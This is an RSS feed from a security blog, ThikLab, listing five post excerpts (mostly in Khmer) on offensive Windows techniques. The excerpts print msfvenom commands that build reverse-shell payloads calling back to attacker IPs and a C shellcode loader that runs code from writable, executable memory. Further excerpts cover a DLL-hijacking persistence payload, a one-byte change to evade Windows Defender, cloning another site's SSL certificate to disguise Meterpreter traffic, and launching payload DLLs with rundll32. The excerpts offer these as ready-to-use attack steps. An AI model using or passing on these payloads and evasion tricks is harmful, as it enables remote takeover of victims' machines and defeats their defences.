<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>reverse-shell on ThikLab - CyberSec</title>
    <link>https://thiklab.com/en/tags/reverse-shell/</link>
    <description>Recent content in reverse-shell on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Wed, 21 Jun 2023 21:01:06 +0700</lastBuildDate>
    
        <atom:link href="https://thiklab.com/en/tags/reverse-shell/index.xml" rel="self" type="application/rss+xml" />
    

      
      <item>
        <title>Process Injection without Write/Execute Permission</title>
        <link>https://thiklab.com/en/posts/process-injection-without-write-exec-permission/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/process-injection-without-write-exec-permission/</guid>
        <description>Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹងសាកល្បង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&amp;#34; &amp;#34;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&amp;#34; &amp;#34;\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0&amp;#34; &amp;#34;\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01&amp;#34; &amp;#34;\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41&amp;#34; &amp;#34;\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d&amp;#34; &amp;#34;\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48&amp;#34; &amp;#34;\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff&amp;#34; &amp;#34;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>reverse-shell</category>
            
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
            
              <category>Metasploit</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>DLL Hijacking - Persistence Method</title>
        <link>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</link>
        <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
        <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖
1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>reverse-shell</category>
            
          
            
              <category>persistence</category>
            
          
        
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>1 Byte Changed Evading Win Defender</title>
        <link>https://thiklab.com/en/posts/av-evading-1-byte-change/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/av-evading-1-byte-change/</guid>
        <description>1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖
សូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ \xfc ។
តស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖
ប្ដូរ \xfc ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. \xfd, \x3a, \x6f\ ។ល។រក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable = char first[] = &#34;\xfc&#34;;Build ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។ខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //payload.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>reverse-shell</category>
            
          
            
              <category>c-shellcode</category>
            
          
        
        
        
          
            
              <category>WinExE</category>
            
          
            
              <category>CobaltStrike</category>
            
          
        
      </item>
      
      <item>
        <title>Impersonate SSL - MSF Bypass Detection</title>
        <link>https://thiklab.com/en/posts/bypass-detection-msf-shell/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/bypass-detection-msf-shell/</guid>
        <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។
Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។
បើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>metasploit</category>
            
          
            
              <category>ssl</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>reverse-shell</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Execute DLL Payloads</title>
        <link>https://thiklab.com/en/posts/exec-dll-payload/</link>
        <pubDate>Tue, 01 Nov 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 01 Nov 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/exec-dll-payload/</guid>
        <description>Generate DLL Payload នៅក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច (Kali, Parrot) សូមបើកផ្ទាំង Terminal ហើយបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
1  kali@1337:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b &amp;#39;\x00\xff&amp;#39; -f dll &amp;gt; idm.dll   Execute DLL ឥឡូវចូលទៅកាន់ម៉ាស៊ីនវីនដូ ហើយវាយពាក្យបញ្ជាដូចខាងក្រោម៖
1  cmd&amp;gt; c:\Windows\System32\rundll32.exe c:\Users\Zyzz\Desktop\idm32.dll,xoxo   ល្បិចក្នុងការដំណើរការ DLL គឺស្ថិតនៅត្រង់សញ្ញា &amp;quot;,&amp;quot; ហើយបញ្ចប់ដោយតួរអក្សរពីក្រោយ (ដាក់អ្វីក៏បាន)។
Get Reverse Shell តស់! ត្រលប់ទៅកាន់ផ្ទាំង Terminal វិញនោះយើងនឹងទទួលបាន Reverse Shell ពីវីនដូ៕</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>reverse-shell</category>
            
          
        
        
          
            
              <category>Metasploit</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
